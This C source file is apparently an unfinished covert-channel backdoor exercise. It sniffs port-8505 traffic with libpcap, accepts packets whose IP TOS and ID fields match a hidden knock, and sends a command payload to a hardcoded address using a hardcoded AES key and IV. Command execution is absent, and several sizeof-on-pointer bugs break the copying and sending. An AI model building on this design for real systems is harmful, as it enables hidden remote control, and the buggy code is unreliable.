#include <stdio.h>
#include <stdlib.h>
#include <pcap.h>
#include <errno.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netinet/if_ether.h>
#include <netinet/ether.h>
#include "./src/encrypt_utils.h"
#include "./src/socketwrappers.h"
#include "main.h"

#define FILTER "tcp and port 8505"
#define PAYLOAD_KEY "8505"
#define ADDRESS "192.168.1.13"
#define PORT "8505"
#define BUFFERSIZE 1024

struct payload{
    char key[5]; // always 8505
    char buffer[1024]; // for either commands or results
};

unsigned char *key = (unsigned char *)"01234567890123456789012345678901"; //Key
unsigned char *iv = (unsigned char*)"0123456789012345"; //IV

int Packetcapture();
void Callback(u_char* arg, const struct pcap_pkthdr* pkthdr, const u_char* packet);
void ReadPacket(u_char* arg, const struct pcap_pkthdr* pkthdr, const u_char* packet);
void ParseIP(u_char* args, const struct pcap_pkthdr* pkthdr, const u_char* packet);
void ParseTCP(u_char* args, const struct pcap_pkthdr* pkthdr, const u_char* packet);
void ParsePayload(const u_char *payload, int len);
void CreatePayload(char *command, unsigned char *encrypted);
void SendPayload(const unsigned char *tcp_payload);
bool CheckKey(u_char ip_tos, u_short ip_id);
int main(int argc, char **argv){
    char *c = "c";
    if(strcmp(argv[1],c) == 0){
        unsigned char encrypted[sizeof(struct payload)];
        char hello[BUFFERSIZE] = "hello";
        CreatePayload(hello, encrypted);
        SendPayload(encrypted);
        exit(1);
    } else {
        Packetcapture();
    }

    /*unsigned char *plaintext = (unsigned char *)"This is a test";
    unsigned char decryptedtext[128];
    unsigned char ciphertext[128];
    int decryptedlen, cipherlen;
    printf("Plaintext is: %s\n", plaintext);
    cipherlen = encryptMessage(plaintext, strlen((char*)plaintext) + 1, key,iv, ciphertext);
    printf("Ciphertext: %s\n",ciphertext);
    decryptedlen = decryptMessage(ciphertext, cipherlen, key, iv, decryptedtext);
    printf("Decrypted text is: %s \n", decryptedtext);*/

    return 0;
}

int Packetcapture(){
    char errorbuffer[PCAP_ERRBUF_SIZE];
    struct bpf_program fp; //holds fp program info
    pcap_if_t *interface_list;
    pcap_t* interfaceinfo;
    bpf_u_int32 netp; //holds the ip

    //find the first network device capable of packet capture
    if(pcap_findalldevs(&interface_list,errorbuffer) == -1){
        printf("pcap_findalldevs: %s\n", errorbuffer);
        exit(0);
    }

    //open the network device
    //BUFSIZ is defined in pcap.h
    if((interfaceinfo = pcap_open_live(interface_list->name, BUFSIZ, 1, -1, errorbuffer)) == NULL){
        printf("pcap_open_live(): %s\n", errorbuffer);
        exit(0);
    }

    if(pcap_compile(interfaceinfo, &fp, FILTER, 0, netp) == -1){
        perror("pcap_comile");
    }

    if(pcap_setfilter(interfaceinfo, &fp) == -1){
        perror("pcap_setfilter");
    }

    pcap_loop(interfaceinfo, -1, ReadPacket, NULL);
    return 0;
}

void Callback(u_char* arg, const struct pcap_pkthdr* pkthdr, const u_char* packet){
    int i = 0;
    static int count = 0;

    printf("Packet Count: %d\n", ++count);
    printf("Received Packet Size: %d\n", pkthdr->len);
    printf("Payload:\n");
    for(i=0; i < (pkthdr->len); i++){
            printf("%C \n", packet[i]);
    }
}


void ReadPacket(u_char* args, const struct pcap_pkthdr* pkthdr, const u_char* packet){
    //grab the type of packet
    struct ether_header *ethernet;
    ethernet = (struct ether_header *)packet;
    u_int16_t type = ntohs(ethernet->ether_type);

    if(type == ETHERTYPE_IP){
        ParseIP(args, pkthdr, packet);
    }
}
void ParseIP(u_char* args, const struct pcap_pkthdr* pkthdr, const u_char* packet){
    const struct my_ip* ip;
    u_int length = pkthdr->len;
    u_int hlen,off,version;
    int len;

    //skip past the ethernet header
    ip = (struct my_ip*)(packet + sizeof(struct ether_header));
    length-= sizeof(struct ether_header);

    if(length < sizeof(struct my_ip)){
        printf("Packet length is incorrect %d", length);
        exit(1);
    }

    len = ntohs(ip->ip_len);
    hlen = IP_HL(ip);
    version = IP_V(ip);
    off = ntohs(ip->ip_off);

    if(version != 4){
        perror("Unknown error");
        exit(1);
    } else if(hlen < 5){
        perror("Bad header length");
        exit(1);
    } else if(length < len){
        perror("Truncated IP");
        exit(1);
    } else if(ip->ip_p == IPPROTO_TCP){
        printf("Protocal: TCP\n");
        printf("IPID: %hu\n", ip->ip_id);
        printf("TOS: %u\n", ip->ip_tos);
        if(CheckKey(ip->ip_tos, ip->ip_id)){
            printf("Reading payload\n");
            ParseTCP(args, pkthdr, packet);
        } else {
            printf("Packet tossed wrong key\n");
        }
    } else if((off & 0x1fff) == 0){
        printf("IP: %s\n", inet_ntoa(ip->ip_src));
        printf("%s %d %d %d %d\n", inet_ntoa(ip->ip_dst), hlen, version, len, off);
    }

}

bool CheckKey(u_char ip_tos, u_short ip_id){
    if(ip_tos == 'l' && ip_id == 'b'){
        return true;
    } else {
        return false;
    }
}

void ParseTCP(u_char* args, const struct pcap_pkthdr* pkthdr, const u_char* packet){
    const struct sniff_tcp *tcp=0;
    const struct my_ip *ip;
    const char *payload;

    int size_ip;
    int size_tcp;
    int size_payload;

    printf("TCP Packet\n");

    ip = (struct my_ip*)(packet + 14);
    size_ip = IP_HL(ip)*4;

    tcp = (struct sniff_tcp*)(packet + 14 + size_ip);
    size_tcp = TH_OFF(tcp)*4;

    if(size_tcp < 20){
        perror("TCP: Control packet length is incorrect");
        exit(1);
    }

    printf("Source port: %d\n", ntohs(tcp->th_sport));
    printf("Destination port: %d\n", ntohs(tcp->th_dport));
    payload = (u_char *)(packet + 14 + size_ip + size_tcp);

    size_payload = ntohs(ip->ip_len) - (size_ip + size_tcp);

    if(size_payload > 0){
        printf("Payload (%d bytes):\n", size_payload);
        ParsePayload(payload, size_payload);
    }
}

void ParsePayload(const u_char *payload, int len){
    //decrypt payload
    //parse the first x bytes for the key
    //parse the rest into a struct

    //unsigned char decryptedtext[128];
    //int decryptedlen, cipherlen;
    //cipherlen = strlen((char*)payload);
    //decryptedlen = decryptMessage((unsigned char*)payload, cipherlen, key, iv, decryptedtext);
    printf("Payload text is: %s \n", payload);
}

void CreatePayload(char *command, unsigned char *encrypted){
    struct payload p;
    unsigned char tcp_payload[sizeof(p)];
    //unsigned char ciphertext[sizeof(struct payload)];

    strncpy(p.key, PAYLOAD_KEY, sizeof(PAYLOAD_KEY));
    strncpy(p.buffer, command, sizeof((char*) command));
    memcpy(tcp_payload, &p, sizeof(p));
    //printf("Plaintext is: %s\n", tcp_payload);
    //encryptMessage(tcp_payload, strlen((char*)tcp_payload) + 1, key,iv, ciphertext);
    //printf("Ciphertext is: %s\n", ciphertext);
    strncpy((char *)encrypted, (const char *)tcp_payload, sizeof(tcp_payload));
    printf("Size of tcp_payload: %lu \n", sizeof(tcp_payload));
}

void SendPayload(const unsigned char *tcp_payload){
    int serversocket, bytesSent;
    serversocket = makeConnect(ADDRESS, PORT);
    if((bytesSent = send(serversocket, tcp_payload, sizeof(tcp_payload), 0)) < 0){
        perror("Send");
        exit(1);
    }
    printf("Bytes Sent: %d \n", bytesSent);
}
